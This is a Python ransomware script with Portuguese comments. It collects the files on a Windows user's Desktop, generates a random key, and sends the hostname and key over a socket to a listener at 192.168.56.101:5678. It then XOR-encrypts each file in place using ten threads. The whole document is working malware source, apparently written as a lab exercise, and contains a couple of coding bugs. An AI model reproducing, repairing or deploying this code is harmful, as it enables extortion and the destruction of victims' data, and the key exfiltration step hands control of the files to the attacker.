from concurrent.futures import thread
import socket
import os
import threading
import queue
import random

#funçao de encriptação
def encrypt(key):
    while True:
        file = q.get()
        print(f'Encriptação{file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                #Implementacao da chave index
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print(f'{file} encriptacao completa')
        except:
            print('falhou em encriptar')
            thread.sleep(10)
        q.task_done()

#informação de conexao        
IP_ADDRESS = '192.168.56.101'
PORT = 5678

#Informação da encriptacao
ENCRYPTION_LEVEL = 512 // 8
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;[]{}|'
key_char_pool_len = len(key_char_pool)

#Pega filepaths para encriptar
print("preparando arquivos...")
desktop_path = os.environ['USERPROFILE']+'\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}')and f != __file__[:-2]+'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print("Sucesso em encontrar arquivos!")

#Pegando o host do cliente
hostname = os.getenv('COMPUTERNAME')

#gerando chave de encriptacao
print("Gerando chave de encriptacao")
key = ''
for i in range(ENCRYPTION_LEVEL):
    key += key_char_pool(random.randint(0, key_char_pool_len-1))
print("Chave gerada!")

#Conectando ao server para transferir chave e o host
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP_ADDRESS, PORT))
    print('Sucesso em conectar... transmitindo hostname e chave')
    s.send(f'{hostname} : {key}'.encode('utf-8'))
    print('Transmissao de dados finalizada')
    s.close()
#Armazenando arquivos em uma fila para threads para o uso     
q = queue.Queue()
for f in abs_files:
    q.put(f)
#threads de configuração para se preparar para criptografia    
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()
    
q.join()
print('Encriptação e upload completo!!!')
input()
